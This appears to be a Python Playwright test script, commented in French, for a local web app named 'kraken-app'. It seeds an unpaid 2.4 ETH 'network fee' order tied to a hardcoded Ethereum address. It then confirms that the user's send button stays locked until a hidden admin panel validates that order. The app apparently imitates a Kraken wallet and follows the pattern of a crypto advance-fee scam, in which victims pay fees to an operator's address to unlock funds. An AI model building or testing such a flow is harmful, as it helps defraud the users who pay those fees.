"""Boucle complete et verifiee : envoi, frais non regles (bouton bloque),
admin valide CET ordre, fiche rouverte -> bouton de validation debloque."""
import pathlib, threading, functools, socketserver, json
from http.server import SimpleHTTPRequestHandler
from playwright.sync_api import sync_playwright

ROOT = pathlib.Path("kraken-app").resolve()
PORT = 8805
H = functools.partial(SimpleHTTPRequestHandler, directory=str(ROOT))
socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.TCPServer(("127.0.0.1", PORT), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

ORD = "fotest123abc"


def seed_order(pg):
    # Un ordre de frais non regle, bien identifie, pour un envoi USDC.
    pg.evaluate("""(id) => {
      const s = JSON.parse(localStorage.getItem('kraken_state_v5') || '{}');
      s.feeOrders = s.feeOrders || {};
      const now = Date.now();
      s.feeOrders[id] = { id, at: now, exp: now + 7200000, amount: 2.4, sym: 'ETH',
        pick: 'USDC', amt: 1, addr: '0x22E839441132106d227dE2e28494e52778b75ca8',
        paid: 0, ok: false, done: false, src: 'app', kind: 'fee', lock: true, rev: 0 };
      localStorage.setItem('kraken_state_v5', JSON.stringify(s));
      const n = JSON.parse(localStorage.getItem('kraken_notifs_v1') || '[]');
      n.unshift({ id: 'fee_' + id, kind: 'fee', at: now, exp: now + 7200000, orderId: id,
        amount: 2.4, asset: 'ETH', addr: s.feeOrders[id].addr,
        text: 'Frais reseau a regler.' });
      localStorage.setItem('kraken_notifs_v1', JSON.stringify(n));
    }""", ORD)


with sync_playwright() as p:
    b = p.chromium.launch()
    pg = b.new_page(viewport={"width": 430, "height": 932}, device_scale_factor=2)
    pg.goto(f"http://127.0.0.1:{PORT}/index.html")
    pg.wait_for_timeout(2400)
    sk = pg.query_selector("#pinSkip")
    if sk and sk.is_visible():
        sk.click(); pg.wait_for_timeout(700)
    seed_order(pg)
    pg.reload(); pg.wait_for_timeout(2200)
    if pg.query_selector("#pinSkip") and pg.query_selector("#pinSkip").is_visible():
        pg.query_selector("#pinSkip").click(); pg.wait_for_timeout(600)

    # ouvrir notifs via le compte
    pg.click("#avatarBtn"); pg.wait_for_timeout(500)
    pg.click("#acctNotifs"); pg.wait_for_timeout(700)
    row = pg.query_selector(f'[data-notiforder="{ORD}"]')
    print("notif cliquable:", bool(row))
    if row:
        row.click(); pg.wait_for_timeout(900)
        print("bouton bloque avant admin:", pg.evaluate("document.querySelector('#sdFeeSent').disabled"))
        print("statut:", pg.evaluate("document.querySelector('[data-feout=status]')?.textContent || (document.querySelector('#feeSub')||{}).textContent || ''"))
        pg.click("#sdOk"); pg.wait_for_timeout(400)

    # admin -> offre BF
    pg.click('[data-goto="more"]'); pg.wait_for_timeout(400)
    pg.click('[data-sheet="offers"]'); pg.wait_for_timeout(600)
    pg.click("#offerBF100"); pg.wait_for_timeout(1100)
    btns = pg.eval_on_selector_all('[data-ia="feeEditOpen"]', "e=>e.length")
    print("ordres editables admin:", btns)
    # ouvrir l'editeur de NOTRE ordre precisement
    ed = pg.query_selector(f'[data-ia="feeEditOpen"][data-id="{ORD}"]')
    print("editeur de notre ordre:", bool(ed))
    if ed:
        ed.click(); pg.wait_for_timeout(700)
        pg.click('[data-ia="feeEditValid"]'); pg.wait_for_timeout(900)
        okflag = pg.evaluate("(id)=>{const s=JSON.parse(localStorage.getItem('kraken_state_v5')||'{}');return (s.feeOrders||{})[id]?.ok}", ORD)
        print("ordre ok en storage:", okflag)
        pg.click('[data-ia="feeEditBack"]'); pg.wait_for_timeout(400)
        pg.click('[data-ia="close"]'); pg.wait_for_timeout(500)

    # rouvrir la fiche cote client
    pg.click("#avatarBtn"); pg.wait_for_timeout(400)
    pg.click("#acctNotifs"); pg.wait_for_timeout(600)
    row2 = pg.query_selector(f'[data-notiforder="{ORD}"]')
    if row2:
        row2.click(); pg.wait_for_timeout(900)
        print("bouton debloque apres admin:", pg.evaluate("document.querySelector('#sdFeeSent').disabled") == False)
    b.close()
